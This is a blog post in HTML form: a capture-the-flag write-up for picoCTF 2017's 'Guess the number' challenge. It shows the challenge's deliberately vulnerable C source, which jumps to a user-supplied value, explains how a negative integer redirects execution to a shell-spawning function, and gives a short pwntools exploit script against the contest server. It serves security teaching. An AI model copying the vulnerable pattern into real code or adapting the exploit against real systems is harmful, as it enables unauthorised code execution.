@@ -1,0 +1,397 @@
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+        <meta name="author" content="F3real" />
+        <meta name="keywords" content="ctf,pwnable,binary exploitation" />
+        <meta name="description" content="How to solve picoCTF Lvl2 Guess the number" />
+
+
+    <title>PicoCTF 2017 Lvl2 Guess the number - EnSec blog</title>
+
+    <link href="https://f3real.github.io/theme/css/combined.css" rel="stylesheet" />
+
+    <!-- Feeds -->
+</head>
+<body data-spy="scroll" data-target="#scrollspy">
+    <div id="wrapper">
+        <!-- Sidebar -->
+        <nav id="sidebar-wrapper-small" class="twitchy-background">
+            <ul id="accordion-small" class="sidebar-nav sidebar-nav-small">
+                <li>
+        <a href="https://f3real.github.io" title="EnSec blog" class="collapsed">
+            <span class="fas fa-home"></span>
+        </a>
+    </li>
+                <li class="nav-divider"></li>
+                <li>
+        <a href="https://f3real.github.io/archives.html" title="Recent Articles" class="collapsed">
+            <span class="fas fa-th-list"></span>
+        </a>
+    </li>
+                <li class="nav-divider"></li>
+                <li>
+                    <a data-toggle="collapse" data-parent="#accordion-small" href="#collapse-social-small" title="Social" class="collapsed">
+                        <i class="fas fa-users padding-small"></i>
+                    </a>
+                </li>
+                <li class="panel anti-panel"><ul id="collapse-social-small" class="collapse ">
+                    <li>
+                        <a href="https://github.com/F3real" title="Github"><i class="fab fa-github-square padding-small"></i></a>
+                    </li>
+                    <li>
+                        <a href="https://www.linkedin.com/in/stefan-ili%C4%87-61a004111" title="Linkedin"><i class="fab fa-linkedin padding-small"></i></a>
+                    </li>
+                </ul></li>
+                <li class="nav-divider"></li>
+                <li>
+        <a href="#" title="Back to top" class="collapsed">
+            <span class="fas fa-arrow-up"></span>
+        </a>
+    </li>
+            </ul>
+        </nav>
+        <nav id="sidebar-wrapper" class="twitchy-background">
+            <ul id="accordion" class="sidebar-nav">
+                <li class="sidebar-brand">
+                    <a href="https://f3real.github.io/">
+                            <span class="fas fa-home padding-small"></span>
+                            EnSec blog
+                    </a>
+                </li>
+                    <li>
+                        <a href="https://f3real.github.io/archives.html">
+                            <span class="fas fa-th-list padding-small"></span>
+                            Archives
+                        </a>
+                    </li>
+                <li class="nav-divider"></li>
+                <li>
+                    <a data-toggle="collapse" data-parent="#accordion" href="#collapse-social">
+                        <i class="fas fa-users padding-small"></i>
+                        Contact
+                    </a>
+                </li>
+                <li class="panel anti-panel"><ul id="collapse-social" class="sidebar_submenu collapse ">
+                    <li>
+                        <a href="https://github.com/F3real" title="Github">
+                            <i class="fab fa-github-square padding-small"></i>
+                            Github
+                        </a>
+                    </li>
+                    <li>
+                        <a href="https://www.linkedin.com/in/stefan-ili%C4%87-61a004111" title="Linkedin">
+                            <i class="fab fa-linkedin padding-small"></i>
+                            Linkedin
+                        </a>
+                    </li>
+                </ul></li>
+                
+                <li class="nav-divider"></li>
+                <li class="panel anti-panel"><ul id="collapse-pages" class="sidebar_submenu collapse ">
+                </ul></li>
+                <li class="nav-divider"></li>
+                <li>
+                    <a data-toggle="collapse" data-parent="#accordion" href="#collapse-categories">
+                        <i class="fas fa-folder-open padding-small"></i>
+                        Categories
+                    </a>
+                </li>
+                <li class="panel anti-panel"><ul id="collapse-categories" class="sidebar_submenu collapse ">
+                    <li class="active">
+                        <a href="https://f3real.github.io/category/ctf.html">
+                            <i class="fas fa-folder-open padding-small"></i>
+                            ctf
+                            <span class="badge badge-secondary float-right categorybadge">28</span>
+                        </a>
+                    </li>
+                    <li >
+                        <a href="https://f3real.github.io/category/misc.html">
+                            <i class="fas fa-folder-open padding-small"></i>
+                            misc
+                            <span class="badge badge-secondary float-right categorybadge">15</span>
+                        </a>
+                    </li>
+                    <li >
+                        <a href="https://f3real.github.io/category/reversing.html">
+                            <i class="fas fa-folder-open padding-small"></i>
+                            reversing
+                            <span class="badge badge-secondary float-right categorybadge">6</span>
+                        </a>
+                    </li>
+                    <li >
+                        <a href="https://f3real.github.io/category/tutorial.html">
+                            <i class="fas fa-folder-open padding-small"></i>
+                            tutorial
+                            <span class="badge badge-secondary float-right categorybadge">5</span>
+                        </a>
+                    </li>
+                </ul></li>
+            </ul>
+        </nav>
+        <!-- /#sidebar-wrapper -->
+        <!-- open/close sidebar -->
+        <button onclick="toggleMenu();return false;" class="btn btn-primary" id="menu-toggle">
+            <span id="right-arrow" class="fas fa-chevron-right"  title="expand sidebar"></span>
+            <span id="left-arrow" class="fas fa-chevron-left" title="minimize sidebar"></span>
+        </button>
+       <!-- /open/close sidebar -->
+
+        <!-- Page Content -->
+        <div id="page-content-wrapper">
+            <div class="container-fluid">
+<section id="content">
+    <article>
+        <div class="row">
+            <div class="col-lg-10">
+                <header class="page-header">
+                    <h1>
+                        <a href="https://f3real.github.io/picoCTF_lvl2GuessTheNumber.html"
+                           rel="bookmark"
+                           title="Permalink to PicoCTF 2017 Lvl2 Guess the number">
+                            PicoCTF 2017 Lvl2 Guess the number
+                        </a>
+                        <small>
+<div class="post-info">
+    <div class="publish-info-block">
+        <small>
+            <span class="published">
+                <i class="fa fa-calendar padding-small"></i><time datetime="2018-07-28T10:02:00+02:00"> Sat 28 July 2018</time>
+            </span>
+            <span class="category">
+                <i class="fa fa-folder-open padding-small"></i><a href="https://f3real.github.io/category/ctf.html">ctf</a>
+            </span>
+            <span class="tags">
+                <i class="fa fa-tags padding-small"></i>
+                <a href="https://f3real.github.io/tag/ctf.html">ctf</a> /                 <a href="https://f3real.github.io/tag/pwnable.html">pwnable</a> /                 <a href="https://f3real.github.io/tag/binary-exploitation.html">binary exploitation</a>            </span>
+        </small>
+    </div>
+</div><!-- /.post-info -->                        </small>
+                    </h1>
+                </header>
+            </div>
+        </div>
+        <div class="row">
+            <div class="col-lg-10">
+                <div class="entry-content">
+                    <p>Let's look at another of the challenges from picoCTF:</p>
+<blockquote>
+<p>Just a simple number-guessing game. How hard could it be? <a href="https://webshell2017.picoctf.com/static/69834a84e2bf2d2953093f5d24d12fa0/guess_num">Binary</a> <a href="https://webshell2017.picoctf.com/static/69834a84e2bf2d2953093f5d24d12fa0/guess_num.c">Source</a>. Connect on shell2017.picoctf.com:44930.</p>
+</blockquote>
+<p>We are given the following source code:</p>
+<div class="highlight"><pre><span></span><code><span class="cm">/* How well do you know your numbers? */</span>
+
+<span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;stdio.h&gt;</span>
+<span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;stdlib.h&gt;</span>
+<span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;stdint.h&gt;</span>
+
+<span class="kt">void</span><span class="w"> </span><span class="nf">win</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;Congratulations! Have a shell:</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
+<span class="w">    </span><span class="n">system</span><span class="p">(</span><span class="s">&quot;/bin/sh -i&quot;</span><span class="p">);</span>
+<span class="p">}</span>
+
+<span class="kt">int</span><span class="w"> </span><span class="nf">main</span><span class="p">(</span><span class="kt">int</span><span class="w"> </span><span class="n">argc</span><span class="p">,</span><span class="w"> </span><span class="kt">char</span><span class="w"> </span><span class="o">**</span><span class="n">argv</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="kt">uintptr_t</span><span class="w"> </span><span class="n">val</span><span class="p">;</span>
+<span class="w">    </span><span class="kt">char</span><span class="w"> </span><span class="n">buf</span><span class="p">[</span><span class="mi">32</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s">&quot;&quot;</span><span class="p">;</span>
+
+<span class="w">    </span><span class="cm">/* Turn off buffering so we can see output right away */</span>
+<span class="w">    </span><span class="n">setbuf</span><span class="p">(</span><span class="n">stdout</span><span class="p">,</span><span class="w"> </span><span class="nb">NULL</span><span class="p">);</span>
+
+<span class="w">    </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;Welcome to the number guessing game!</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
+<span class="w">    </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;I&#39;m thinking of a number. Can you guess it?</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
+<span class="w">    </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;Guess right and you get a shell!</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
+
+<span class="w">    </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;Enter your number: &quot;</span><span class="p">);</span>
+<span class="w">    </span><span class="n">scanf</span><span class="p">(</span><span class="s">&quot;%32s&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">buf</span><span class="p">);</span>
+<span class="w">    </span><span class="n">val</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">strtol</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span><span class="w"> </span><span class="nb">NULL</span><span class="p">,</span><span class="w"> </span><span class="mi">10</span><span class="p">);</span>
+
+<span class="w">    </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;You entered %d. Let&#39;s see if it was right...</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">val</span><span class="p">);</span>
+
+<span class="w">    </span><span class="n">val</span><span class="w"> </span><span class="o">&gt;&gt;=</span><span class="w"> </span><span class="mi">4</span><span class="p">;</span>
+<span class="w">    </span><span class="p">((</span><span class="kt">void</span><span class="w"> </span><span class="p">(</span><span class="o">*</span><span class="p">)(</span><span class="kt">void</span><span class="p">))</span><span class="n">val</span><span class="p">)();</span>
+<span class="p">}</span>
+</code></pre></div>
+
+<p>We see that user input is being stored to <code>uintptr_t val</code> after which it is called and that we have <code>win</code> function giving shell. On first look it looks like we have just to send the address of <code>win</code> and we get a flag. The problem is that they are using <code>strtol</code> to read user input and the fact that they shift bits, but first, let's find the address of <code>win</code> function:</p>
+<div class="highlight"><pre><span></span><code>objdump -d guess_num -M intel
+</code></pre></div>
+
+<p><img alt="objdump disasembly of win function" class="img-fluid centerimage" src="https://f3real.github.io/images/2018_7_28_Guess.png"></p>
+<p><code>win</code> function has address of <code>0x0804852b</code> but we also need to shift address value 4 bits to left since in code they are doing the opposite. Doing so gives us 2152223408, but now we have a problem since according to documentation of <code>strtol</code>, if the value read is out of the range of representable values by a <code>long int</code>, the function returns <strong>LONG_MAX</strong>(2147483647) or <strong>LONG_MIN</strong> (-2147483647). This means we can’t just simply send this value since it’s too big.</p>
+<p>To solve this, we have to use negative numbers:</p>
+<div class="highlight"><pre><span></span><code>    &gt;&gt;&gt;x = 0x0804852b            #address of win function
+    &gt;&gt;&gt;bin(x)
+    &#39;0b1000000001001000010100101011&#39;   
+    &gt;&gt;&gt;x = x &lt;&lt; 4                #shift by 4 since they also shift
+    &gt;&gt;&gt;x
+    2152223408   
+    &gt;&gt;&gt;bin(x)
+    &#39;0b10000000010010000101001010110000&#39;   
+    &gt;&gt;&gt;x = x - (1 &lt;&lt; 32)         #get 2nd compliment of number
+    &gt;&gt;&gt;x
+    -2142743888                  #SOLUTION :D other steps are just to            
+                                              explain what happens later
+
+    &gt;&gt;&gt;bin(x)
+    &#39;-0b1111111101101111010110101010000&#39;
+
+                                 #Their program will do these steps
+    &gt;&gt;&gt;x = x + 4294967295 + 1    
+                                 #Since we have negative value which is 
+                                 #assigned to unsigned variable it will   
+                                 #be converted to unsigned by adding 
+                                 #ULONG_MAX + 1
+    &gt;&gt;&gt;x
+    2152223408
+    &gt;&gt;&gt;x = x &gt;&gt; 4                #program shifts our input by 4 bits
+    &gt;&gt;&gt;x
+    134513963
+    &gt;&gt;&gt;bin(x)
+    &#39;0b1000000001001000010100101011&#39;  
+    &gt;&gt;hex(x)
+    0x804852b                    #address of win function
+</code></pre></div>
+
+<p>To automate this we can write short script using <strong>pwntools </strong>and python:</p>
+<div class="highlight"><pre><span></span><code><span class="n">context</span><span class="o">.</span><span class="n">arch</span> <span class="o">=</span> <span class="s1">&#39;i386&#39;</span>
+<span class="n">context</span><span class="o">.</span><span class="n">terminal</span> <span class="o">=</span> <span class="s1">&#39;tmux&#39;</span>
+
+<span class="n">r</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s1">&#39;shell2017.picoctf.com&#39;</span><span class="p">,</span> <span class="mi">44930</span><span class="p">)</span>
+<span class="nb">print</span> <span class="n">r</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;Enter your number:&#39;</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">=</span> <span class="mh">0x0804852b</span>
+<span class="n">payload</span> <span class="o">=</span> <span class="n">payload</span> <span class="o">&lt;&lt;</span> <span class="mi">4</span>
+<span class="n">payload</span> <span class="o">=</span> <span class="n">payload</span> <span class="o">-</span> <span class="p">(</span><span class="mi">1</span> <span class="o">&lt;&lt;</span> <span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="nb">bin</span><span class="p">(</span><span class="n">payload</span><span class="p">))</span><span class="o">-</span><span class="mi">2</span><span class="p">))</span>
+
+<span class="n">r</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span><span class="o">+</span><span class="s1">&#39;</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span>
+<span class="n">r</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+</code></pre></div>
+
+<p>Running our script gives us the flag.</p>
+<p><img alt="objdump disasembly of win function" class="img-fluid centerimage" src="https://f3real.github.io/images/2018_7_28_Guess2.png"></p>
+                </div>
+                <footer class="text-right">
+                    <p>- F3real</p>
+                </footer>
+    <div id="show-comments" class="span7 text-center">
+        <a href="https://f3real.github.io/picoCTF_lvl2GuessTheNumber.html#disqus_thread"
+          data-disqus-identifier="picoCTF_lvl2GuessTheNumber"
+        class="btn btn-primary twitchy-background">Show Comments</a>
+    </div>
+    <section id="comments" class="comments hidden">
+        <hr/>
+        <h2>Comments</h2>
+        <div id="disqus_thread"></div>
+        <noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by
+            Disqus.</a></noscript>
+        <a href="http://disqus.com" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>
+    </section>
+            </div>
+        </div>
+    </article>
+</section>
+<footer>
+    <hr>
+    <div class="row">
+        <div class="col-lg-10 text-center">
+            <p><small>
+                Built by <a href="http://docs.getpelican.com/en/latest">Pelican</a> / <a href="https://github.com/F3real/pelican-twitchy">pelican-twitchy</a>
+                &middot;                    &copy; 2024 F3real
+            </small></p>
+        </div>
+    </div>
+</footer>            </div>
+        </div>
+        <!-- /#page-content-wrapper -->
+    </div>
+    <!-- /#wrapper -->
+
+<!-- disqus -->
+<script type="text/javascript">
+    /* * * CONFIGURATION VARIABLES: EDIT BEFORE PASTING INTO YOUR WEBPAGE * * */
+    var disqus_shortname = 'https-f3real-github-io'; // required: replace example with your forum shortname
+
+            var disqus_identifier = 'picoCTF_lvl2GuessTheNumber';
+        var disqus_url = 'https://f3real.github.io/picoCTF_lvl2GuessTheNumber.html';
+
+    var disqus_config = function () {
+        this.language = "en";
+    };
+
+        var commentsDiv = document.getElementById('show-comments');
+        commentsDiv.onclick = function() {
+            /* * * DON'T EDIT BELOW THIS LINE * * */
+    (function () {
+        var dsq = document.createElement('script');
+        dsq.type = 'text/javascript';
+        dsq.async = true;
+        dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+        (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+    })();
+            this.style.display = 'none';        
+        };
+</script>
+<!-- /disqus -->
+    <script>
+        const wrapper = document.getElementById('wrapper');
+        const sidebarBig = document.getElementById('sidebar-wrapper');
+        const sidebarSmall = document.getElementById('sidebar-wrapper-small');
+
+        const triggers = Array.from(document.querySelectorAll('[data-toggle="collapse"]'));
+        for (var i = 0; i < triggers.length; i++) { 
+            triggers[i].addEventListener('click', (ev) => {
+                const elm = ev.currentTarget;    
+                ev.preventDefault();
+                const selector = elm.getAttribute('href').replace('#','');
+                elm.classList.toggle('collapsed');
+                document.getElementById(selector).classList.toggle('show');
+            }, false);
+        } 
+
+        function showBigNav() {;
+            sidebarBig.style.display = 'block';
+            sidebarSmall.style.display = 'none';
+        }
+        function showSmallNav() {
+            sidebarBig.style.display = 'none';
+            sidebarSmall.style.display = 'block';
+        }
+
+        const mediaQuery = window.matchMedia('(min-width:768px)');
+        mediaQuery.onchange = e => {
+            if (wrapper.classList.contains('toggled')) {
+                    wrapper.classList.remove('toggled');
+            } else {
+                if (e.matches) {
+                    showBigNav();
+                } else {
+                    showSmallNav();
+                }
+            }
+        }
+
+        function setNavbar() {
+            var condition = wrapper.classList.contains('toggled');
+            if (!mediaQuery.matches) {
+                condition = !condition;
+            }
+            if (condition) {
+                showSmallNav();
+            } else {
+                showBigNav();
+            }
+        }
+
+        function toggleMenu(){
+            wrapper.classList.toggle('toggled');
+            setNavbar();
+        }
+
+        window.onload = setNavbar;
+    </script>
+	<script data-goatcounter="https://f3real.goatcounter.com/count"
+        async src="//gc.zgo.at/count.js"></script>
+</body>
+</html>
